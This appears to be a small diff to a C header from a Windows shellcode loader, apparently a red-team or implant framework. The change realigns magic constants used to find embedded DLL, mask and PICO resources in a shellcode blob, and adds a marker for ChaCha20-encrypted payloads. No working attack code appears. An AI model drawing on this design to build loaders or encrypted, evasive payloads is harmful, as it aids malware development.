@@ -18,9 +18,10 @@ typedef LONG NTSTATUS;
  * the assembled shellcode blob.  find_resource_by_magic() scans forward from
  * the shellcode base to find them without relying on COFF relocation fixups.
  * The values are chosen to be unlikely to appear in normal code/data.       */
-#define MAGIC_DLL  0xC001B008ul
-#define MAGIC_MASK 0xC001B009ul
-#define MAGIC_PICO 0xC001B007ul
+#define MAGIC_DLL   0xC001B008ul
+#define MAGIC_MASK  0xC001B009ul
+#define MAGIC_PICO  0xC001B007ul
+#define MAGIC_NONCE 0xC001B00Aul  /* present iff payload encrypted with chacha20 */
 
 /* ── RESOURCE layout ──────────────────────────────────────────────────────
  * Each named-section payload is wrapped as { uint32_t len; uint8_t value[] }
